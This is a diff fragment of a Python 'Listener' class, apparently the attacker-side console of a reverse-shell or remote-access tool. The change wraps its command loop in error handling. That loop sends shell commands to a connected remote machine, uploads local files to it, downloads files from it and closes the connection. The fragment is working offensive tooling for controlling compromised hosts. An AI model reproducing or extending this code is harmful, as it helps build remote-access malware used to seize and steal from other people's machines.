@@ -166,20 +166,20 @@ class Listener:
             command = command.split(" ")
 
             if command[0] != "killconnection":
-                # try:
-                if command[0] == "upload":
-                    file_content = read_file(command[1])
-                    command.append(file_content.decode('utf-8'))  # add to the command the content of the file
+                try:
+                    if command[0] == "upload":
+                        file_content = read_file(command[1])
+                        command.append(file_content.decode('utf-8'))  # add to the command the content of the file
 
-                result = self.execute_remotely(command, self.num)
+                    result = self.execute_remotely(command, self.num)
 
-                if command[0] == "exit":
-                    break
+                    if command[0] == "exit":
+                        break
 
-                elif command[0] == "download" and "[-] Error " not in result:
-                    result = write_file(command[1], result)
-                # except Exception:
-                #     result = "[-] Error during command execution."
+                    elif command[0] == "download" and "[-] Error " not in result:
+                        result = write_file(command[1], result)
+                except Exception:
+                    result = "[-] Error during command execution."
                 print(result)
             else:
                 print("[-] Not valid option!")
